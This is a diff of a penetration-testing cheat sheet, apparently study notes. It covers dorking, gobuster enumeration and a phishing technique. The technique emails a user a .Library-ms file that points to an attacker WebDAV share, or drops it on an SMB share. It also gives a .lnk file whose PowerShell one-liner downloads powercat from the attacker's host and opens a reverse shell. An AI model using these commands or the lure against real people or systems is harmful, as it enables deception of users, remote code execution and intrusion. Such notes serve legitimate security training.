@@ -2,10 +2,12 @@
 
 ## Dorking
 
-Passive: `site:www.site-to-hack.com filetype:pdf` \
+Passive: 
+- browser: `site:www.site-to-hack.com filetype:pdf`
+- cli: `kali$ firefox --search "Microsoft Edge site:exploit-db.com`, `inurl:`, `intext:`, `intitle:`
 Gobuster: 
 - `gobuster dir -x pdf -u $TargetIp -w /usr/share/wordlist/dirb/common.txt`
-- `gobuster dir -x pdf -u $TargetIp -w /usr/share/wordlist/dirb/big.txt`
+- `gobuster dir -x .pdf, .txt -u $TargetIp -w /usr/share/wordlist/dirb/big.txt`
 Exiftool: `exiftool -a -u somefile.pdf`
 
 ## Macros
@@ -72,12 +74,12 @@ kali$ wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /path/to/webdav/s
 
 #### Extension `.Library-ms`
 
-Make a `myautomatedfakeinstalltofoolsomeuser.Library-ms` file pointing to the Webdav share on Kali, send it by mail and tell the user to click it.
-In the Webdav share, prepare a reverse shell. For example with [PowerCat](https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1), make a `.lnk` file:
+Make a `myautomatedfakeinstalltofoolsomeuser.Library-ms` file pointing to the Webdav share on Kali, send it by mail and tell the user to click it. \
+In the Webdav share, prepare a reverse shell. For example with [PowerCat](https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1) in a `.lnk` file:
 ```
 powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://myip:myhttpport/powercat.ps1');powercat -c myip -p myncport -e powershell"
 ```
-Instead of sending the Library file by email, it can be share by Samba:
+Instead of sending the Library file by email, it can be shared by Samba:
 ```
 smbclient //$TargetIp/$TargetSharedDirectory -c 'put myautomatedfakeinstalltofoolsomeuser.Library-ms.Library-ms'
 ```
